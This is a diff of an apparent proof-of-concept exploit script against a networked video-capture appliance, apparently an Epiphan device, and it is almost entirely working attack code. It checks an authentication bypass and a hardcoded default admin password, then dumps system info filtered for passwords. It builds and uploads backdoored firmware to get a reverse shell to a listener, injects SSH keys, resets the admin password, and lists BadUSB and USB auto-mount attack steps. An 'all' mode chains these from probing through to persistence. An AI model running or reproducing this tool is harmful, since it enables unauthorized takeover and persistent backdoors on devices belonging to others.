+    print("\n  --- allinfo.cgi Dump ---")
     try:
-        r = req(target, "/admin/allinfo.cgi?inline=on", auth=auth, timeout=30)
-        fname = f"allinfo_{target.replace('.', '_')}.txt"
-        with open(fname, "w") as f:
-            f.write(r.text)
-        print(f"  [+] Saved {len(r.text)} bytes to {fname}")
+        r = xrequest(target, "/admin/allinfo.cgi?inline=on",
+                     auth=auth or AUTH_STRATEGY, timeout=30)
+        if r.status_code == 200 and len(r.text) > 100:
+            fname = f"allinfo_{target.replace('.', '_')}.txt"
+            with open(fname, "w") as f:
+                f.write(r.text)
+            print(f"  [+] Saved {len(r.text)} bytes to {fname}")
+            # Extract key info
+            for line in r.text.split("\n"):
+                if any(k in line.lower() for k in ["serial", "version", "mac", "ip",
+                                                     "hostname", "ssh", "password"]):
+                    print(f"      {line.strip()[:120]}")
+        else:
+            print(f"  [-] HTTP {r.status_code} or empty response")
     except Exception as e:
-        print(f"  [!] Error: {e}")
+        print(f"  [!] {e}")
 
 
-# =============================================================================
+# ==============================================================================
+#  REVERSE SHELL (via firmware backdoor)
+# ==============================================================================
+
+def reverse_shell(target, auth, lhost, lport, firmware_path=None):
+    """Get a reverse shell by uploading backdoored firmware."""
+    print(f"\n  --- Reverse Shell via Firmware Backdoor ---")
+    print(f"  [>] LHOST={lhost} LPORT={lport}")
+
+    if not lhost:
+        print("  [!] --lhost required")
+        return False
+
+    fw_path = firmware_path or FIRMWARE_PATH
+    if not os.path.exists(fw_path):
+        print(f"  [!] Firmware not found at: {fw_path}")
+        print(f"  [!] Provide path with --firmware <file>")
+        return False
+
+    print(f"  [>] Using firmware: {fw_path}")
+    
+    # Also fetch SSH key if available
+    ssh_key = None
+    key_path = os.path.expanduser("~/.ssh/id_rsa.pub")
+    if os.path.exists(key_path):
+        with open(key_path) as f:
+            ssh_key = f.read().strip()
+
+    payload = craft_backdoor_firmware(
+        fw_path,
+        lhost=lhost,
+        lport=lport,
+        ssh_key=ssh_key,
+        new_password="pwned123"
+    )
+
+    if not payload:
+        return False
+
+    print(f"\n  [>] Set up listener: nc -lvnp {lport}")
+    print(f"  [>] Uploading in 3 seconds...")
+    time.sleep(3)
+
+    return upload_firmware(target, payload, auth)
+
+
+# ==============================================================================
+#  USB BACKDOOR (Physical Access)
+# ==============================================================================
+
+def exploit_usb(target):
+    """Generate a malicious USB drive image for physical attack."""
+    print("\n  --- USB Attack Surface ---")
+    print("""
+  Physical attack scenarios (requires USB port access):
+
+  [USB HID - BadUSB Keyboard Injection]
+    Plug in a USB device that enumerates as keyboard.
+    The hid-handler service accepts ALL keyboards with no allowlist.
+    Keystrokes are sent to the UI as if from the front panel.
+    -> Navigate to /admin/ and change password or upload firmware.
+
+  [USB Storage - Auto-mount Exploit]
+    Plug in a USB drive >= 1GB with a supported filesystem.
+    Default rechotplug mode auto-copies recordings.
+    -> Can trigger kernel filesystem parser bugs.
+    -> Label the drive 'EPIPHAN' to bypass size check.
+
+  Hardware path: ff9d0000.usb0 -> DWC3 -> XHCI
+  Kernel: 4.19.0-xilinx-v2019.2 (aarch64)
+  Driver: uvcvideo, usb-storage, usbserial/ftdi/cp210x/pl2303
+  """)
+    return True
+
+
+# ==============================================================================
+#  PROBE (basic connectivity and vuln check)
+# ==============================================================================
+
+def probe(target):
+    """Check if target is alive and which vulnerabilities apply."""
+    print("\n  --- Probe ---")
+    findings = []
+
+    # Check connectivity
+    try:
+        r = xrequest(target, "/", timeout=5)
+        findings.append(("Device reachable", r.status_code == 200 or r.status_code == 302))
+        print(f"  [>] HTTP reachable: {r.status_code}")
+    except Exception as e:
+        print(f"  [!] {e}")
+        return
+
+    # Check auth bypass
+    try:
+        r = xrequest(target, "/api/system/firmware", auth=None, timeout=5)
+        bypass = r.status_code == 200
+        findings.append(("CVE-0x03 Auth Bypass", bypass))
+        if bypass:
+            print(f"  [+] CVE-0x03: AUTH BYPASS WORKS!")
+        else:
+            print(f"  [-] CVE-0x03: Auth required (HTTP {r.status_code})")
+    except Exception as e:
+        print(f"  [!] CVE-0x03: {e}")
+
+    # Check default password
+    try:
+        r = xrequest(target, "/api/system/firmware",
+                     auth=HTTPBasicAuth("admin", DEFAULT_PASSWORD), timeout=5)
+        default_works = r.status_code == 200
+        findings.append(("CVE-0x01 Default Password", default_works))
+        if default_works:
+            print(f"  [+] CVE-0x01: Default password 'lkjhyu8*' works!")
+        else:
+            print(f"  [-] CVE-0x01: Default password rejected")
+    except Exception as e:
+        print(f"  [!] CVE-0x01: {e}")
+
+    # Check HTTPS
+    try:
+        r = requests.get(f"http://{target}/", timeout=5, verify=False)
+        findings.append(("HTTP available", True))
+    except:
+        findings.append(("HTTP available", False))
+
+    # Summary
+    print(f"\n  --- Probe Summary ---")
+    for name, ok in findings:
+        print("  [+] {}".format(name) if ok else "  [-] {}".format(name))
+
+    vulnerable = any(ok for _, ok in findings)
+    if vulnerable:
+        print(f"\n  [+] Device is VULNERABLE. Run: python3 poc.py {target} --exploit all")
+    else:
+        print(f"\n  [-] Device seems secure")
+
+
+# ==============================================================================
 #  MAIN
-# =============================================================================
+# ==============================================================================
 
 def main():
     parser = argparse.ArgumentParser(
@@ -564,41 +618,42 @@ def main():
         epilog="""
 Examples:
   %(prog)s 192.168.1.100
-  %(prog)s 192.168.1.100 --exploit rce-channel
-  %(prog)s 192.168.1.100 --exploit reverse-shell --lhost 10.0.0.5 --lport 4444
-  %(prog)s 192.168.1.100 --exploit dump-all
-  %(prog)s 192.168.1.100 --exploit password-reset --new-pwd pwned123
-  %(prog)s 192.168.1.100 --exploit auth-bypass
+  %(prog)s 192.168.1.100 --exploit firmware-backdoor --lhost 10.0.0.5 --lport 4444
+  %(prog)s 192.168.1.100 --exploit enable-ssh
+  %(prog)s 192.168.1.100 --exploit password-reset --new-pwd mypass123
+  %(prog)s 192.168.1.100 --exploit probe
         """
     )
     parser.add_argument("target", help="Device IP address")
-    parser.add_argument("--password", default=DEFAULT_PASSWORD,
-                        help=f"Admin password (default: {DEFAULT_PASSWORD})")
+    parser.add_argument("--password", default=None,
+                        help="Admin password if known")
     parser.add_argument("--new-pwd", default="pwned123",
-                        help="New password for password reset")
+                        help="New password to set")
     parser.add_argument("--exploit", choices=[
-        "all", "default-password", "rce-channel", "ptz-injection",
-        "csrf", "firmware-backdoor", "info-leak", "password-reset",
-        "dump-all", "dump-allinfo", "reverse-shell", "static-keys",
-        "vtun-backdoor", "auth-bypass"
+        "all", "probe", "auth-bypass", "default-password", "password-reset",
+        "firmware-backdoor", "reverse-shell", "enable-ssh",
+        "dump-info", "dump-allinfo", "usb",
     ], default="all", help="Specific exploit to run")
     parser.add_argument("--lhost", help="Listener IP for reverse shell")
     parser.add_argument("--lport", type=int, default=4444,
                         help="Listener port for reverse shell")
-    parser.add_argument("--cmd", default="id",
-                        help="Command to execute for RCE exploits")
+    parser.add_argument("--firmware", default=FIRMWARE_PATH,
+                        help="Path to .bfrm firmware file")
+    parser.add_argument("--ssh-key",
+                        help="SSH public key file to inject (default: ~/.ssh/id_rsa.pub)")
     parser.add_argument("--no-https", action="store_true",
                         help="Use HTTP instead of HTTPS")
 
     args = parser.parse_args()
 
     if args.no_https:
-        global req
-        _orig_req = req
-        def req(target, path, auth=None, method="GET", **kwargs):
+        global xrequest
+        _orig = xrequest
+        def xrequest(target, path, auth=None, method="GET", **kwargs):
             url = f"http://{target}{path}"
             kwargs.setdefault("timeout", 10)
             kwargs.setdefault("verify", False)
+            kwargs.setdefault("allow_redirects", False)
             if auth:
                 kwargs["auth"] = auth
             return requests.request(method, url, **kwargs)
@@ -606,37 +661,50 @@ Examples:
     target = args.target
     print(BANNER % target)
 
-    # Auto-probe auth — first try no-auth (CVE-0x0b bypass), then default creds
+    # Auto-probe auth strategies
     auth = probe_auth(target)
+    if args.password:
+        auth = HTTPBasicAuth("admin", args.password)
+
+    # SSH key for injection
+    ssh_key = None
+    if args.ssh_key:
+        kp = os.path.expanduser(args.ssh_key)
+        if os.path.exists(kp):
+            with open(kp) as f:
+                ssh_key = f.read().strip()
 
     exploits = {
-        "auth-bypass":      lambda: exploit_auth_bypass(target),
-        "default-password": lambda: exploit_default_password(target),
-        "vtun-backdoor":    lambda: exploit_vtun_backdoor(target),
-        "rce-channel":      lambda: exploit_rce_channel(target, auth, args.cmd),
-        "ptz-injection":    lambda: exploit_ptz_argument(target, auth),
-        "csrf":             lambda: exploit_csrf(target),
-        "firmware-backdoor":lambda: exploit_firmware_backdoor(target, auth),
-        "info-leak":        lambda: exploit_info_leak(target),
-        "password-reset":   lambda: reset_password(target, auth, args.new_pwd),
-        "dump-all":         lambda: dump_all(target, auth),
-        "dump-allinfo":     lambda: dump_allinfo(target, auth),
-        "static-keys":      lambda: exploit_static_keys(target),
-        "reverse-shell":    lambda: reverse_shell(target, auth, args.lhost, args.lport),
+        "probe":             lambda: probe(target),
+        "auth-bypass":       lambda: check_auth_bypass(target),
+        "default-password":  lambda: check_default_password(target),
+        "password-reset":    lambda: reset_password(target, auth, args.new_pwd),
+        "firmware-backdoor": lambda: (
+            upload_firmware(target,
+                craft_backdoor_firmware(args.firmware, args.lhost, args.lport,
+                                       ssh_key, args.new_pwd),
+                auth)
+            if args.lhost
+            else print("  [!] --lhost required for reverse shell")),
+        "reverse-shell":     lambda: reverse_shell(target, auth, args.lhost, args.lport, args.firmware),
+        "enable-ssh":        lambda: enable_ssh(target, auth, ssh_key),
+        "dump-info":         lambda: dump_info(target, auth),
+        "dump-allinfo":      lambda: dump_allinfo(target, auth),
+        "usb":               lambda: exploit_usb(target),
     }
 
     if args.exploit == "all":
-        for name, func in exploits.items():
-            try:
-                func()
-            except KeyboardInterrupt:
-                print("\n  [!] Interrupted")
-                sys.exit(1)
-            except Exception as e:
-                print(f"  [!] {name} failed: {e}")
+        # Smart order: probe -> bypass -> escalate -> persist
+        exploits["auth-bypass"]()
+        exploits["default-password"]()
+        exploits["dump-info"]()
+        exploits["password-reset"]()
+        exploits["enable-ssh"]()
+        exploits["dump-allinfo"]()
+        exploits["usb"]()
     else:
-        if args.exploit == "reverse-shell" and not args.lhost:
-            print("  [!] --lhost is required for reverse-shell exploit")
+        if args.exploit in ("reverse-shell", "firmware-backdoor") and not args.lhost:
+            print("  [!] --lhost is required")
             sys.exit(1)
         exploits[args.exploit]()
 
